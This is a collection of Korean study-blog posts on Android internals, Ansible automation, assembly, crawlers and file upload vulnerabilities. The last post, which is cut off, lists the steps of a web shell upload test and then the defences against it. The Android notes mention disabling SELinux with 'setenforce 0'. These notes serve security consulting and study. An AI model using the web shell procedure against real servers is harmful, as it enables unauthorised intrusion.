[{"content":"1️⃣ Android App 구성요소 - 4대 컴포넌트 : 액티비티, 서비스, 컨텐츠 프로바이더, 브로드캐스트 리시버\n- 액티비티 : 앱의 기본 실행 단위\n- 서비스 : 백그라운드 작업을 위한 컴포넌트\n- 브로드캐스트 리시버 : 안드로이드 시스템 또는 다른 앱에서 전달하는 메시지 수신\n- 컨텐츠 프로바이더 : 앱 간의 데이터 공유를 목적으로 사용하는 컴포넌트\n- 프래그먼트 : 액티비티처럼 사용할 수 있는 뷰\n- 인텐트 : 앱 구성 요소 사이에서 작업을 요청하는 메시지 객체\n📜액티비티 (Activity) - 앱의 기본 실행 단위로, 화면에 뿌려질 내용(뷰)과 수행할 작업을 정의\n- 하나의 액티비티 : Activity.class + layout.xml\n- 액티비티 상태\n\u0026gt; 활성 상태(activity running) : 현재 액티비티가 화면을 점유하고 출력중인 상태\n\u0026gt; 일시정지 상태(pause) : 현재 액티비티가 일시적으로 사용 불가능한 상태\n\u0026gt; 비활성 상태(stop) : 현재 액티비티가 다른 액티비티에 완벽히 가려진 상태\n메서드 설명 onCreate() 액티비티 생성 시 호출, 화면에 보이는 뷰의 일반적인 상태를 설정 onStart() 액티비티가 사용자에게 표시되기 직전에 호출 onResume() 액티비티가 사용자와 상호작용 하기 전에 호출 onPause() 시스템이 다른 액티비티를 재개하지 직전에 호출 onStop() 액티비티가 더이상 사용자에게 표시되지 않을 때 호출 onDestroy() 액티비티 소멸 전에 호출(마지막 호출) 📜액티비티 Flow 📜프래그먼트 - 액티비티처럼 이용할 수 있는 뷰\n- 한 화면에 여러 화면 구성 시 개별 액티비티 클래스의 복잡성을 줄여줄 수 있음\n- 여러개의 프래그먼트를 하나의 액티비티에 조합해 창이 여러 개인 UI 구성 가능\n- 하나의 프래그먼트 : Fragment.class + layout.xml\n- Fragment, ListFragment, PreferenceFragment, DialogFragment 등\n📜프래그먼트와 액티비티의 관계 📜서비스 - 백그라운드에서 실행되는 프로세스로, 별도의 사용자 인터페이스 제공 X\n- 화면과 상관 없이 장시간 처리해야 하는 작업 구현에 적합\n(ex. 메신저, 음악 플레이어 등)\n- 하나의 서비스 : Service.class\n- 서비스 구동 방법\n\u0026gt; startService() : 어플리케이션 구성 요소가 startService() 호출 시 동작(위엄)\n\u0026gt; bindService() : 어플리케이션 구성요소가 bindService() 호출 후 바인드 되면 동작 (상호작용)\n메서드 설명 onCreate() 서비스 최초 생성 시 수행 (설정 절차) onStartCommand() startService() 호출 시 동작하는 함수 onBind() bindService() 호출 시 동작하는 함수 onDestroy() 서비스 소멸 시 동작하는 함수 📜서비스 생명 주기 📜브로드캐스트 리시버 - 안드로이드 시스템 또는 다른 앱의 브로드캐스트 메시지를 송수신하는 기능을 의미\n- 이벤트 모델로 수행되는 컴포넌트 = 없으면 말고, 있으면 모두 실행\n- 전화 수신, 배터리 부족, 문자 수신, 와이파이 발견, 블루투스 연결 등\n- 수신 방법\n\u0026gt; manifest 이용 : manifest에 인텐트 등록 -\u0026gt; Receiver 클래스 / onReceive()\n\u0026gt; context 이용 : 새로운 Receive 클래스 인스턴스 -\u0026gt; IntenFilter 등록\n📜컨텐츠 프로바이더 (Content Provider) - 앱 간의 데이터 공유를 목적으로 사용하는 컴포넌트\n- 일반적으로는 다른 앱의 데이터에 외부 앱이 접근 할 수 없음\n- 주소록, 사진첩, 메모 읽어오기 (URI 기반)\n- 안드로이드에서 제공하는 URI에는 권한이 필요한 항목과 필요하지 않은 항목들이 있음\n📜인텐트 - 앱 구성 요소 사이에서 작업을 요청하는 메시지 객체\n- 인텐트 유형\n\u0026gt; 명시적 인텐트 : 시작할 구성요소를 명시적으로 지정하는 것\n\u0026gt; 암시적 인텐트 : 특정 구성요소를 지정하지 않고, 수행할 작업을 지정하면 해당 작업을 처리할 수 있는 구성요소가 선택되어 작업을 수행 (전화걸기, 지도에 현재 위치 표시 등)\n📜빌드 프로세스 - 컴파일러는 소스 코드를 DEX 파일로 변환하고 그 외 모든 것을 리소스로 변환\n- APK 관리자는 DEX 파일과 리소스를 단일 APK에 결합\n- APK 생성\n\u0026gt; 디버그 : 스튜디오 자동 구성\n\u0026gt; 릴리즈 : 개발자 서명 필요\n📜안드로이드 앱 프로젝트 구성요소 - Manifests\n\u0026gt; AndroidManifest.xml\n\u0026gt; 앱 구성 요소 및 권한 정보를 정의\n- java\n\u0026gt; 자바 소스파일이 들어있는 폴더\n\u0026gt; 패키지명과 동일한 하위 폴더들이 만들어짐\n- res\n\u0026gt; 리소스 파일이 들어있는 폴더\n\u0026gt; XML 레이아웃, 그림, 문자열을 정의한 XML\n📜gradle - 빌드 배포 도구\n- 안드로이드 스튜디오와 빌드 시스템은 독립 관계\n- 안드로이드 스튜디오는 코드 편집만, gradle이 빌드\n- build.gradle\n\u0026gt; 모듈의 빌드 방법을 정의한 스크립트\n\u0026gt; 빌드에 사용할 SDK버전, 사용 라이브러리 등\n- setting.gradle\n\u0026gt; 앱 빌드 시 포함할 모듈을 정의\n","permalink":"https://crackernote.github.io/posts/2022-07-10-android-app/","summary":"1️⃣ Android App 구성요소 - 4대 컴포넌트 : 액티비티, 서비스, 컨텐츠 프로바이더, 브로드캐스트 리시버\n- 액티비티 : 앱의 기본 실행 단위\n- 서비스 : 백그라운드 작업을 위한 컴포넌트\n- 브로드캐스트 리시버 : 안드로이드 시스템 또는 다른 앱에서 전달하는 메시지 수신\n- 컨텐츠 프로바이더 : 앱 간의 데이터 공유를 목적으로 사용하는 컴포넌트\n- 프래그먼트 : 액티비티처럼 사용할 수 있는 뷰\n- 인텐트 : 앱 구성 요소 사이에서 작업을 요청하는 메시지 객체","title":"Android App 구조"},{"content":"1️⃣ Android 보안모델 - 기본적으로 리북스 커널이 제공하는 보안 기능을 사용\n- 스마트폰을 사용하는 방식에 맞게 보안 기능을 재구성\n- 애플리케이션 격리 : Sandbox, Permission, TrustZone\n- 플랫폼 강화 : SELinux, ASLR, Exploit mitigation\n- 디바이스 무결성 : Data Encryption\n- 업무를 위한 기능 : 프로파일 기업 서비스\n📜Sandbox - 앱 설치 시 고유한 UID를 자동으로 할당 (10000번부터 시작) ex) user id u0_a36은 uid 10036번을 가짐\n- UID별로 전용 프로세스 및 디렉터리를 가짐 \u0026lt;- 샌드박스\n- 시스템 데몬 및 앱은 고정된 UID 사용 (일부만 루트 0)\n📜Sandbox - 앱 설치 시 고유한 UID를 자동으로 할당 (10000번부터 시작) ex) user id u0_a36은 uid 10036번을 가짐\n- UID별로 전용 프로세스 및 디렉터리를 가짐 \u0026lt;- 샌드박스\n- 시스템 데몬 및 앱은 고정된 UID 사용 (일부만 루트 0)\n📜Permission - 앱 내의 AndroidManifest.xml 파일에 권한을 명시해 요청 가능\n- 앱 설치 시 사용자에게 해당 권한 허가 여부를 물어봄\n- 일부 권한은 미리 설치된 기본 앱이나 OS와 동일한 키로 서명된 앱만 허용\n📜TrustZone - 디바이스 공간을 물리적 또는 논리적으로 분리해서 주요 자원을 보호하는 방법\n- 보호되는 영역을 TEE(Trusted Execution Environment)라고 부름\n- 활용 사례 : 지문 저장 정보, 지불 관련 기능 저장, DRM 암호 정보 저장\n📜코드서명 \u0026amp; 플랫폼키 - 모든 안드로이드 앱은 개발자 서명을 필요로 함\n- Same Origin Policy : 동일 개발자만 업데이트 가능\n- 시스템 앱은 여러 플랫폼 키로 서명됨 : 같은 키 서명 시 리소스 공유\n📜검증된 부트 - 안드로이드 4.4 버전부터 도입 : verify\n- 암호학적 해시 트리를 이용해 블록 디바이스의 무결성 검증\n- 부트로더 : 디바이스 전원이 켜질 때 실행되는 하드웨어 고유 특수 프로그램\n- 안드로이드 부트로더는 미공개 \u0026gt; SoC에 특화되어 있음\n📜SELinux - 강제 접근 제어를 포함한 접근 제어 보안 정책을 지원하는 리눅스 커널 보안 모듈\n- 안드로이드 5.0 부터 완전히 적용됨\n- 세가지 운용 모드 : 비활성(disabled), 허용(permissive), 시행(enforcing)\n- getenforce / setenforce 0\n","permalink":"https://crackernote.github.io/posts/2022-07-11-android-security-model/","summary":"1️⃣ Android 보안모델 - 기본적으로 리북스 커널이 제공하는 보안 기능을 사용\n- 스마트폰을 사용하는 방식에 맞게 보안 기능을 재구성\n- 애플리케이션 격리 : Sandbox, Permission, TrustZone\n- 플랫폼 강화 : SELinux, ASLR, Exploit mitigation\n- 디바이스 무결성 : Data Encryption\n- 업무를 위한 기능 : 프로파일 기업 서비스\n📜Sandbox - 앱 설치 시 고유한 UID를 자동으로 할당 (10000번부터 시작) ex) user id u0_a36은 uid 10036번을 가짐\n- UID별로 전용 프로세스 및 디렉터리를 가짐 \u0026lt;- 샌드박스","title":"Android 보안모델"},{"content":"1️⃣ Android 아키텍처 📜리눅스 커널 - 리눅스 커널을 기반으로 하나, 일반 리눅스 커널과는 다름\n- 경량, 저전력, 안정화, 빠른 반응성 등이 주요 핵심\n- 로우 메로리 킬러, 웨이크락, 익명공유메모리, 바인더, 파라노이드 네트워킹 적용\n📜네이티브 영역 - Init\n\u0026gt; 최초로 시작되는 프로세스로 다른 프로세스를 구동\n\u0026gt; 리눅스와 달리 많은 기능을 init 프로세스 하나에 통합함\n\u0026gt; 전통적인 로그인 처리에 사용되는 /etc/passwd, /etc/group 파일 사용 안함 (모바일이라는 전제조건이 단일 사용자 이기때문에\u0026hellip;)\n- 네이티브 라이브러리\n\u0026gt; C/C++로 작석된 라이브러리 (bionic C)\n\u0026gt; 보통 C는 리눅스 관련 라이브러리, C++는 안드로이드 전용 라이브러리\n\u0026gt; 프레임워크와 라이브러리 사이에는 JNI가 필요\n- HAL\n\u0026gt; 안드로이드 프레임워크와 하드웨어(센서) 사이를 연결하는 인터페이스\n📜Dalvic 가상머신 - 안드로이드의 자바 VM 구현\n- 달빅 실행 파일(dex)을 실행 가능\n📜Java 가상머신 VS Dalvic 가상머신 - 스택기반 VS 레지스터 기반\n- 달빅의 명령어 수는 더 적고 코드 길이는 더 길다 (호율성, 속도 향상)\n📜Android Runtime (ART) - ART = \u0026ldquo;Android Runtime\u0026rdquo;\n- 안드로이드 롤리팝(L) 버전(5.0~)부터 정식 도입\n- AOT(Ahead of Time) 런타임 방식을 사용\n- 배터리 수명, 애플리케이션 렉, 가비지 컬렉터 향상 등 여러 측면에서 성능 개선\n📜AOT 컴파일 - 설치 시점에 소스코드를 번역 (달빅은 실행 시점에 소스코드를 번역)\n- 공간은 많이 차지하지만 실행 시간을 대폭 개선할 수 있음\n- 7.0 버전의 경우 최초 설치 시에는 JIT 를 사용하고, 기기를 사용하지 않을 때나 충전 중일때 컴파일을 조금씩 하는 방식 사용\n📜런타임 라이브러리 (=Core Libraries) - 아파치 하모니 프로젝트에서 가져온 라이브러리로, 일부 기능은 확장 또는 완전히 새롭게 개발\n- 프로세스가 동작하면서 라이브러리를 호출할 때 사용\n📜JNI(JAVA Native Interface) - 자바와 다른 언어로 만든 프로그램 사이의 상호작용을 가능하게 하는 인터페이스 제공\n📜바인더(Binder) - 프로세스 간 통신(IPC) 메커니즘(/dev/binder) (OpenBinder 기반)\n- IPC : 서로 다른 프로세스의 공간을 보호하면서 서로간의 통신을 가능하게 함\n- 왜 바인더인가?\n\u0026gt; 하드웨어 가용성 : 유연한 하드웨어 설계를 가능하게 해줌\n\u0026gt; 시스템 커스터마이징 : 하드웨어 제조사와 통신사에 맞는 커스터마이징 지원\n\u0026gt; 애플리케이션 제어 : 애플리케이션 샌드박스 기능 제공\n📜안드로이드 프레임워크 라이브러리 - \u0026lsquo;android,\u0026rsquo; 으로 시작하는 패키지\n- 대부분 자바로 구현되어 있지만, 일부는 네이티브 코드로 구현됨\n- 포함 클래스\n\u0026gt; 시스템에서 제공하는 상위 수준 서비스 활용 클래스\n\u0026gt; 디바이스 하드웨어에 접근하게 해주는 클래스\n\u0026gt; 안드로이드 앱 제작을 위한 기본적인 클래스\n📜APP - 시스템 앱\n\u0026gt; /system 폴더 하위에 위치 (또는 플랫폼 서명 키로 서명한 앱)\n\u0026gt; 사용자가 임의로 제거하거나 변경 불가\n- 사용자 설치 앱\n\u0026gt; /data 폴더에 위치 (읽기-쓰기 가능 파티션)\n\u0026gt; 각 앱은 전용 보안 샌드박스에 설치됨\n\u0026gt; 권한 분리와 최소 권한의 원칙\n","permalink":"https://crackernote.github.io/posts/2022-07-11-android-architecture/","summary":"1️⃣ Android 아키텍처 📜리눅스 커널 - 리눅스 커널을 기반으로 하나, 일반 리눅스 커널과는 다름\n- 경량, 저전력, 안정화, 빠른 반응성 등이 주요 핵심\n- 로우 메로리 킬러, 웨이크락, 익명공유메모리, 바인더, 파라노이드 네트워킹 적용\n📜네이티브 영역 - Init\n\u0026gt; 최초로 시작되는 프로세스로 다른 프로세스를 구동\n\u0026gt; 리눅스와 달리 많은 기능을 init 프로세스 하나에 통합함\n\u0026gt; 전통적인 로그인 처리에 사용되는 /etc/passwd, /etc/group 파일 사용 안함 (모바일이라는 전제조건이 단일 사용자 이기때문에\u0026hellip;)\n- 네이티브 라이브러리","title":"Android 아키텍처"},{"content":"1. Ansible 설치 📜CentOS $ yum install -y ansible 📜Ubuntu $ apt install ansible 📜macOS $ brew install ansible 2. SSH 및 hosts 파일 설정 앤서블은 ssh로 제어 노드와 매니지드 노드가 연결됩니다. 앤서블을 이용하여 작업을 진행하기 전에 authorized_keys에 키를 추가하여 주는 것이 좋습니다. ssh-copy-id 명령을 이용하여 간편하게 키를 설정할 수 있습니다.\n📜ssh key 설정 # Ansible Control Node 에서 실행 # ssh 키 생성 $ ssh-keygen # ssh 키 복사 \u0026gt; Managed Node 로 연결하기 위함 # ssh 연결을 처리할 계정으로 연결 $ ssh-copy-id user@test-host.com 📜hosts 설정 - Ansible Control Node 에서 실행 # /etc/ansible/hosts 파일 열기 $ vi /etc/ansible/hosts # 맨 밑에줄에 Managed Node 추가해주기 [test_server] 127.0.0.1 \u0026gt;\u0026gt; \u0026#34;Managed Node IP로 추가\u0026#34; 3. Ansible 실행 테스트 Ansible과 ssh 설정이 제대로 되었는지 ping 으로 동작을 확인합니다.\n📜Managed Node 를 대상으로 ping 동작 실행 # managed node에 ping 동작 실행 $ ansible test_server -m ping $ ansible -u kali test_server -m ping \u0026gt;\u0026gt; \u0026#34;root 계정이 다른 계정으로 되어있을 경우 계정입력\u0026#34; # ping 결과 \u0026#34;Managed Node IP\u0026#34; | SUCCESS =\u0026gt; { \u0026#34;ansible_facts\u0026#34;: { \u0026#34;discovered_interpreter_python\u0026#34;: \u0026#34;/usr/bin/python\u0026#34; }, \u0026#34;changed\u0026#34;: false, \u0026#34;ping\u0026#34;: \u0026#34;pong\u0026#34; } 4. Ansible Playbook Ansible playbook 을 작성하여 제대로 작동하는지 테스트해봅니다.\n📜PlayBook 작성 (OS Name을 추출하는 playbook) --- - name: Playbook hosts: ubuntu_server remote_user: flus become: yes become_user: root tasks: - name: Check os Name shell: cat /etc/os-release register: os_name - name: print debug: msg: \u0026#34;{{ os_name.stdout }}\u0026#34; 📜Managed Node 를 대상으로 PlayBook 실행 # managed node에 playbook 동작 실행 $ ansible-playbook first_playbook.yml # 정상적으로 playbook 결과 출력 PLAY [Playbook] ***************************************************************************************** TASK [Gathering Facts] ***************************************************************************************** [DEPRECATION WARNING]: Distribution Ubuntu 18.04 on host 192.168.x.x should use /usr/bin/python3, but is using /usr/bin/python for backward compatibility with prior Ansible releases. A future Ansible release will default to using the discovered platform python for this host. See https://docs.ansible.com/ansible/2.9/reference_appendices/interpreter_discovery.html for more information. This feature will be removed in version 2.12. Deprecation warnings can be disabled by setting deprecation_warnings=False in ansible.cfg. ok: [192.168.x.x] TASK [Check os Name] ***************************************************************************************** changed: [192.168.x.x] TASK [print] ***************************************************************************************** ok: [192.168.x.x] =\u0026gt; { \u0026#34;msg\u0026#34;: \u0026#34;NAME=\\\u0026#34;Ubuntu\\\u0026#34;\\nVERSION=\\\u0026#34;18.04.6 LTS (Bionic Beaver)\\\u0026#34;\\nID=ubuntu\\nID_LIKE=debian\\nPRETTY_NAME=\\\u0026#34;Ubuntu 18.04.6 LTS\\\u0026#34;\\nVERSION_ID=\\\u0026#34;18.04\\\u0026#34;\\nHOME_URL=\\\u0026#34;https://www.ubuntu.com/\\\u0026#34;\\nSUPPORT_URL=\\\u0026#34;https://help.ubuntu.com/\\\u0026#34;\\nBUG_REPORT_URL=\\\u0026#34;https://bugs.launchpad.net/ubuntu/\\\u0026#34;\\nPRIVACY_POLICY_URL=\\\u0026#34;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\\\u0026#34;\\nVERSION_CODENAME=bionic\\nUBUNTU_CODENAME=bionic\u0026#34; } PLAY RECAP ***************************************************************************************** 192.168.x.x : ok=3 changed=1 unreachable=0 failed=0 skipped=0 rescued=0 ignored=0 ","permalink":"https://crackernote.github.io/posts/2023-04-04-ansible-%EC%84%A4%EC%B9%98-%EB%B0%8F-%EC%84%A4%EC%A0%95/","summary":"1. Ansible 설치 📜CentOS $ yum install -y ansible 📜Ubuntu $ apt install ansible 📜macOS $ brew install ansible 2. SSH 및 hosts 파일 설정 앤서블은 ssh로 제어 노드와 매니지드 노드가 연결됩니다. 앤서블을 이용하여 작업을 진행하기 전에 authorized_keys에 키를 추가하여 주는 것이 좋습니다. ssh-copy-id 명령을 이용하여 간편하게 키를 설정할 수 있습니다.\n📜ssh key 설정 # Ansible Control Node 에서 실행 # ssh 키 생성 $ ssh-keygen # ssh 키 복사 \u0026gt; Managed Node 로 연결하기 위함 # ssh 연결을 처리할 계정으로 연결 $ ssh-copy-id user@test-host.","title":"Ansible 설치 및 설정하기"},{"content":"1. 스크립트 실행을 위한 playbook 작성 Master Node에 있는 스크립트를 Control Node로 보내고 실행시켜, 실행값을 Master, Control Node 모두 csv 파일로 저장시킨다. 이렇게 여러 서버에 스크립트를 실행하여 Master Node에 결과값을 수집하여 관리가 가능하다.\n📜PlayBook 작성 #excute command example #ansible-playbook -i [inventory_file] --extra-vars \u0026#34;excute_group=[list] excute_date=[YYYYMMDD]\u0026#34; [playbook_file] --- - hosts: ubuntu_server #실행 대상 목록 gather_facts: no #대상 서버 정보 수집 여부 connection: ssh #접근 프로토콜 remote_user: ubuntu #대상 서버 접근 계정 become: yes #sudo 권한 사용 vars: src_path: /home/ansible/Desktop/script dst_path: /tmp/diagnosis/infra_script run_script: ubuntu.sh result_path: /home/flus result_down_path: /root/infra_result/linux/{{ excute_date }} tasks: - name: Check Script Dir - {{ dst_path }} stat: path={{dst_path}} register: check_dir - name: Make Script Dir - /tmp/diagnosis shell: \u0026#34;mkdir -m 755 -p /tmp/diagnosis\u0026#34; when: not check_dir.stat.exists - name: Make Script Dir - {{ dst_path }} shell: \u0026#34;mkdir -m 755 -p {{dst_path}}\u0026#34; when: not check_dir.stat.exists - name: Deploy Main Script copy: src={{src_path}}/{{ run_script }} dest={{dst_path}}/{{ run_script }} mode=755 owner=root force=yes - name: Run Script shell: \u0026#34;bash {{dst_path}}/{{ run_script }}\u0026#34; - name: Check Hostname shell: echo \u0026#34;`hostname`\u0026#34; register: hostname_result - name: Result File Name shell: \u0026#34;ls | egrep L-LINUX-\u0026#34; register: name_result - name: Result File Stat stat: path: \u0026#34;{{ result_path }}/{{ name_result.stdout }}\u0026#34; register: stat_result - name: Download Result File fetch: src: \u0026#34;{{ result_path }}/{{ name_result.stdout }}\u0026#34; dest: \u0026#34;{{ result_down_path }}/\u0026#34; flat: yes when: stat_result.stat.exists - name: Delete Script \u0026amp; Result file: path: \u0026#34;{{item}}\u0026#34; state: absent with_items: - \u0026#34;/tmp/diagnosis\u0026#34; - \u0026#34;{{ result_path }}/{{ name_result.stdout }}\u0026#34; - name: Check Result File debug: msg: \u0026#34;[CHECK_RESULT] [ OK ] {{ hostname_result.stdout }} : {{ result_down_path }}/{{ name_result.stdout }}\u0026#34; when: stat_result.stat.exists 2. Playbook 실행 📜 Ansible Control Node 에서 실행 결과 [root@localhost Desktop]# ansible-playbook --extra-vars \u0026#34; excute_date=20230405\u0026#34; linux_security_check.yml PLAY [ubuntu_server] ***************************************************************************************** TASK [Check Script Dir - /tmp/diagnosis/infra_script] ********************************************************************* [DEPRECATION WARNING]: Distribution Ubuntu 18.04 on host 192.168.x.x should use /usr/bin/python3, but is using /usr/bin/python for backward compatibility with prior Ansible releases. A future Ansible release will default to using the discovered platform python for this host. See https://docs.ansible.com/ansible/2.9/reference_appendices/interpreter_discovery.html for more information. This feature will be removed in version 2.12. Deprecation warnings can be disabled by setting deprecation_warnings=False in ansible.cfg. ok: [192.168.x.x] TASK [Make Script Dir - /tmp/diagnosis] *********************************************************************************** [WARNING]: Consider using the file module with state=directory rather than running \u0026#39;mkdir\u0026#39;. If you need to use command because file is insufficient you can add \u0026#39;warn: false\u0026#39; to this command task or set \u0026#39;command_warnings=False\u0026#39; in ansible.cfg to get rid of this message. changed: [192.168.x.x] TASK [Make Script Dir - /tmp/diagnosis/infra_script] ********************************************************************** changed: [192.168.x.x] TASK [Deploy Main Script] ***************************************************************************************** changed: [192.168.x.x] TASK [Run Script] ***************************************************************************************** changed: [192.168.x.x] TASK [Check Hostname] ***************************************************************************************** changed: [192.168.x.x] TASK [Result File Name] ***************************************************************************************** changed: [192.168.x.x] TASK [Result File Stat] ***************************************************************************************** ok: [192.168.x.x] TASK [Download Result File] ***************************************************************************************** changed: [192.168.x.x] TASK [Delete Script \u0026amp; Result] ***************************************************************************************** changed: [192.168.x.x] =\u0026gt; (item=/tmp/diagnosis) changed: [192.168.x.x] =\u0026gt; (item=/home/flus/L-LINUX-ubuntu-result-2023-04-05.csv) TASK [Check Result File] ***************************************************************************************** ok: [192.168.x.x] =\u0026gt; { \u0026#34;msg\u0026#34;: \u0026#34;[CHECK_RESULT] [ OK ] ubuntu : /root/infra_result/linux/20230405/L-LINUX-ubuntu-result-2023-04-05.csv\u0026#34; } PLAY RECAP ***************************************************************************************** 192.168.x.x : ok=11 changed=8 unreachable=0 failed=0 skipped=0 rescued=0 ignored=0 ","permalink":"https://crackernote.github.io/posts/2023-04-05-ansible-%EC%9D%B4%EC%9A%A9%ED%95%9C-%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%8A%B8-%EC%8B%A4%ED%96%89%EB%B0%A9%EB%B2%95/","summary":"1. 스크립트 실행을 위한 playbook 작성 Master Node에 있는 스크립트를 Control Node로 보내고 실행시켜, 실행값을 Master, Control Node 모두 csv 파일로 저장시킨다. 이렇게 여러 서버에 스크립트를 실행하여 Master Node에 결과값을 수집하여 관리가 가능하다.\n📜PlayBook 작성 #excute command example #ansible-playbook -i [inventory_file] --extra-vars \u0026#34;excute_group=[list] excute_date=[YYYYMMDD]\u0026#34; [playbook_file] --- - hosts: ubuntu_server #실행 대상 목록 gather_facts: no #대상 서버 정보 수집 여부 connection: ssh #접근 프로토콜 remote_user: ubuntu #대상 서버 접근 계정 become: yes #sudo 권한 사용 vars: src_path: /home/ansible/Desktop/script dst_path: /tmp/diagnosis/infra_script run_script: ubuntu.","title":"Ansible을 이용한 스크립트 실행방법"},{"content":"1️⃣ Assembly 기초 📜프로그램과 메모리 - 프로세스 : 메모리에 로드된 프로그램\n- 프로그램은 크게 코드, 데이터로 나누어 볼 수 있음\n- 프로그램에서 사용하는 코드와 데이터는 메모리에 로드되며, 코드 실행 흐름에 따라 변화하는 값들은 스택 또는 힙에 쌓이게됨\n- 운영체제는 프로세스들의 독립적인 공간을 보장함\n- 다른 프로세스의 영역을 함부로 접근하는 것을 막는 매커니즘이 존재\n- 프로세스와 메모리 관리는 운영체제에 의해서 이루어짐\n📜스택(Stack) - LIFO 구조 : Last In - First Out, 가장 처음에 들어간 데이터가 가장 나중에 옴\n- 함수 호출 시 생성되는 지역 변수와 매개 변수가 저장되는 영역\n- 높은 주소에서 낮은 주소로 신장\n📜힙(Heap) - 동적으로 메모리 할당 시 사용하는 영역\n- 낮은 주소에서 높은 주소로 신장\n📜데이터 타입(Data Type) - 비트(bit) : 0 또는 1\n- 바이트(byte) : 8비트\n- 워드(word) : 16비트\n- 더블 워드(dword) : 32비트 (ARM 아키텍처에서는 워드)\n- 쿼드 워드(qword) : 64비트 (ARM 아키텍처에서는 더블워드)\n- 키로 바이트(kb) : 1024비트\n- 메가 바이트(mb) : 1024 키로 바이트\n- 기가 바이트(gb) : 1024 메가 바이트\n📜레지스터(Register) - 빠른 연산을 위해 사용됨 (수행 문맥, 제어 정보, 데이터 임시 저장)\n- 레지스터는 CPU에 내장된 저장 공간으로, CPU 아키텍처마다 다름\n📜명령어 세트(Instruction Sets) - 아키텍처 별로 다른 명령어와 사용방법이 존재하며 크게 데이터 이동, 산술/논리 연산, 제어흐름 명령어 존재 - 데이터 이동 : 메모리 \u0026lt;-\u0026gt; 메모리 , 메모리 \u0026lt;-\u0026gt; 레지스터, 레지스터 \u0026lt;-\u0026gt; 레지스터 - 산술/논리 연산 : 더하기, 빼기, 비트연산, 소수점 계산 등 - 제어흐름 : 분기, 호출, 반환 등\n📜어셈블리 언어 기본형태 - {instruction} destination, source (둘중 하나만 메모리 주소가 될 수 있음) ex) add a,b \u0026gt; a = a+b\n📜주소 표기법 - 빅 엔디안(Big Endian) \u0026gt; 주로 유닉스 시스템인 RISC 프로세서 계열에서 사용하는 바이트 순서 \u0026gt; 메모리 시작 주소를 상위 바이트로부터 기록 \u0026gt; 네트워크 패킷에서도 이 방식을 사용\n- 리틀 엔디안(Little Endian) \u0026gt; 주로 인텔 프로세서 계열에서 많이 사용되는 바이트 순서 \u0026gt; 메모리 시작 주소를 하위 바이트로부터 기록\nEX) 0xabcd : 메모리에 abcd 순서로 기록됨 (빅 엔디안) 메모리에 dcba 순서로 기록됨 (리틀 엔디안)\n","permalink":"https://crackernote.github.io/posts/2022-07-16-%EC%96%B4%EC%85%88%EB%B8%94%EB%A6%AC-%EA%B8%B0%EC%B4%88/","summary":"1️⃣ Assembly 기초 📜프로그램과 메모리 - 프로세스 : 메모리에 로드된 프로그램\n- 프로그램은 크게 코드, 데이터로 나누어 볼 수 있음\n- 프로그램에서 사용하는 코드와 데이터는 메모리에 로드되며, 코드 실행 흐름에 따라 변화하는 값들은 스택 또는 힙에 쌓이게됨\n- 운영체제는 프로세스들의 독립적인 공간을 보장함\n- 다른 프로세스의 영역을 함부로 접근하는 것을 막는 매커니즘이 존재\n- 프로세스와 메모리 관리는 운영체제에 의해서 이루어짐\n📜스택(Stack) - LIFO 구조 : Last In - First Out, 가장 처음에 들어간 데이터가 가장 나중에 옴","title":"Assembly 기초"},{"content":"1️⃣ Crawler Python 을 이용한 Crawler\n📜crawler를 위해 필요한 내용들 requests\nHTTP 통신을 위한 Python 라이브러리 beautifulsoup\nHTML 분석을 위한 Python 라이브러리 pyautogui\nCSS 선택자\n크롤링할 HTML 태그를 선택할때 사용함\n태그 선택자 (h1, a 등 태그 이름으로 선택)\nid 선택자 (#을 앞에 붙인 후 id 값으로 선택)\nHTML \u0026lt;div id=\u0026#34;articleBody\u0026#34;\u0026gt; 본문-- \u0026lt;/div\u0026gt; 선택자 #airticleBody class 선택자 (.을 앞에 붙인 후 class 값으로 선택)\nHTML \u0026lt;div class=\u0026#34;info_group\u0026#34;\u0026gt; 뉴스목록 \u0026lt;/div\u0026gt; 선택자 .airticleBody 자식 선택자 (바로 아래에 있는 태그를 선택한다)\nHTML \u0026lt;div class=\u0026#34;logo_sports\u0026#34;\u0026gt; \u0026lt;span\u0026gt;스포츠\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; 선택자 .logo_sports \u0026gt; span ","permalink":"https://crackernote.github.io/posts/2023-03-26-crawler/","summary":"1️⃣ Crawler Python 을 이용한 Crawler\n📜crawler를 위해 필요한 내용들 requests\nHTTP 통신을 위한 Python 라이브러리 beautifulsoup\nHTML 분석을 위한 Python 라이브러리 pyautogui\nCSS 선택자\n크롤링할 HTML 태그를 선택할때 사용함\n태그 선택자 (h1, a 등 태그 이름으로 선택)\nid 선택자 (#을 앞에 붙인 후 id 값으로 선택)\nHTML \u0026lt;div id=\u0026#34;articleBody\u0026#34;\u0026gt; 본문-- \u0026lt;/div\u0026gt; 선택자 #airticleBody class 선택자 (.을 앞에 붙인 후 class 값으로 선택)\nHTML \u0026lt;div class=\u0026#34;info_group\u0026#34;\u0026gt; 뉴스목록 \u0026lt;/div\u0026gt; 선택자 .airticleBody 자식 선택자 (바로 아래에 있는 태그를 선택한다)","title":"crawler"},{"content":"1️⃣ File Upload 취약점 정리 📜File Upload 취약점 - 서버에 악성스크립트 업로드 하는것\n- web server에 업로드 할수 있느냐, WAS에 업로드하느냐가 엄청큰 차이다.\n- PHP기반웹사이트이면 – PHP 파일 업로드\n- ASP – ASP 기반 파일 업로드…\n- JSP – JSP 기반 파일업로드.. 처리기 매핑에서 매핑되는 것들이 모두된다.\n- 만약에 업로드후 열어봤을때 실행되지 않는다면??? à 텍스트로 뿌려주거나, 바이너리 파일로 다운로드된다.\n- 컨설팅 과정\n파일업로드 가능여부 확인(메뉴확인)\n이미지 파일 업로드 후 경로 확인(허가된 파일) – Jpg,Gif…\n파일 삭제 테스트\n샘플 스크립트 파일 작성 및 업로드\n웹쉘 업로드\nà 삭제하기 전에 반드시 알아야 하는것!! =\u0026gt; 이미지가 올라갔을때 이미지의 절대경로를 반드시 알아야 한다. 만약에 알수가 없으면 웹쉘을 실행할 수 없기때문에 파일 업로드 취약점 사용 불가!!!\n📜취약점 대응 - 업로드 기능 구현 안함 - 가장좋음 - 웹루트 경로 밖에 저장하는 것 - 업로드된 파일을 ftp, nfs등으로 타 서버로 전송 - 업로드된 파일명 확장자 제거하여 저장 - 저장되는 경로에 실행 퍼미션 제거 – 